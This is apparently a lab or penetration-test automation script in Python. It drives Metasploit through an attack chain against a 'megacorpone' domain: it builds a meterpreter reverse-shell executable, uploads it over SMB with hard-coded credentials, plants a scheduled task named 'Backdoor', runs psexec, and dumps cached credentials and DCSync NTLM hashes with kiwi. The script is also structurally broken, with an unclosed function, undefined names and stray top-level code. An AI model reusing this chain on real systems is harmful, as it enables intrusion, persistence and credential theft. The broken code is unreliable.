#!/usr/bin/python3
import pexpect
import os
import logging

LOG_FILE = 'msfscript_log.txt'

RESOURCE_SCRIPTS = [
    '~/resource1.rc',
    '~/resource2.rc',
    '~/resource3.rc',
    '~/resource4.rc',
    '~/resource5.rc'
]

# Configure logging
logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def log_info(message):
    logging.info(message)
    print(message)

def log_error(message):
    logging.error(message)
    print(f'[ERROR] {message}')

def generate_msfshell_exe(process):
    filename = 'msfshell.exe'

    if os.path.exists(filename):
        print("File already exists")
    else:
        msfvenom_command = f'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.22.117.100 LPORT=4444 -f exe > {filename}'
        execute_command(msfvenom_command, process)
        print("File not found - creating")



def main():
    try:
        print ("INITIALISING")
        print ("WELCOME")

        log_info('Generating msfshell.exe...')
        generate_msfshell_exe(process)
        
        print("Starting msfconsole")
        msf_script = pexpect.spawn('msfconsole', encoding='utf-8')

        msf_script.expect('msf6', timeout=120)
        print ("SKIPPING SMB LOGIN - TIME CONSTRAINTS")
        print ("RUNNING RESOURCE1.RC")

        command = 'resource resource1.rc'
        log_info('resource1.rc')
        msf_script.sendline(command)
        msf_script.expect('auxiliary', timeout=120)
        log_info('RESOURCE1.RC COMPLETE - BEGINNING SMBCLIENT')

        #SMB client put shell.exe
        command = 'smbclient //172.22.117.20/C$ -U megacorpone/tstark'
        log_info('smbclient')
        msf_script.sendline(command)
        time.sleep(5)
        log_info('ENTERING PASSWORD')
        msf_script.sendline('Password!')
        msf_script.expect('smb')
        log_info('PUTTING .EXE ON TARGET MACHINE')
        msf_script.sendline('put msfshell.exe')
        log_info('SUCCESS')
        msf_script.expect('smb')
        msf_script.sendline('exit')
        msf_script.expect('auxiliary')
        log_info('exiting')

        command = 'resource resource2.rc'
        log_info('resource2.rc')
        msf_script.sendline(command)
        msf_script.expect_exact('meterpreter >', timeout=240)
        log_info('Meterpreter session active, send to background')
        msf_script.sendline('background')
        msf_script.expect('auxiliary')
        
        command = 'resource resource3.rc'
        log_info('resource3.rc')
















print ("BEGINNING PERSISTENCE SERVICES")
# Running resource3.rc
msf_script.sendline('resource resource3.rc')
msf_script.expect('meterpreter', timeout=120)

print ("SUCCESS - REQUESTING SHELL")
print (msf_script.after)

msf_script.sendline('shell')
msf_script.expect('C:\\ ', timeout=120)

print ("SHELL ESTABLISHED - CREATING SCHEDULED TASK")
print (msf_script.after)

msf_script.sendline('schtasks /create /f /tn Backdoor /SC ONCE /ST 00:00 /TR "C:\shell.exe"')
msf_script.expect('C:\\ ')

print ("SCHEDULED TASK CREATED SUCCESSFULLY - EXITING")
print (msf_script.after)

msf_script.sendline('exit')
msf_script.expect('meterpreter')

print (msf_script.after)

msf_script.sendline('exit')
msf_script.expect('exploit')

print ("RESOURCE 3 COMPLETED - ATTACK SUCCESS")
print (msf_script.after)


print (" BEGINNING PSEXEC")
# Running resource4.rc
msf_script.sendline('resource resource4.rc')
msf_script.expect('meterpreter')

print ("PSEXEC COMPLETED - ATTACK SUCCESS")
print (msf_script.after)

print ("STARTING KIWI")
msf_script.sendline('load kiwi')
msf_script.expect('meterpreter')

msf_script.sendline('kiwi_cmd lsadump::cache')
msf_script.expect('meterpreter')

print ("CACHE DUMP SUCCESS - EXITING KIWI")
print (msf_script.after)

msf_script.sendline('exit')
msf_script.expect('exploit')

print (msf_script.after)


print ("STARTING LATERAL MOVEMENT")
# Running resource5.rc
msf_script.sendline('resource resource5.rc')
msf_script.expect('meterpreter')
print (msf_script.after)

print ("REQUESTING SYSINFO")
msf_script.sendline('sysinfo')
msf_script.expect('meterpreter')
print (msf_script.after)


print ("SUCCESS - ENTERING SHELL")
msf_script.sendline('shell')
msf_script.expect('system32')
print (msf_script.after)


print ("SHELL ESTABLISHED - REQUESTING USERS")
msf_script.sendline('net users')
msf_script.expect('system32')
print ("USERS ESTABLISHED - EXITING - OPENING KIWI")
print (msf_script.after)


msf_script.sendline('exit')
msf_script.expect('meterpreter')
msf_script.sendline('load kiwi')
msf_script.expect('meterpreter')
print (msf_script.after)

print ("KIWI LOADED - TESTING DCSYNC")
msf_script.sendline('dcsync_ntlm cdanvers')
msf_script.expect('meterpreter')

print ("ATTACK SUCCESS - PROVEN VULNERABILITY - SHUTTING DOWN")


msf_script.close()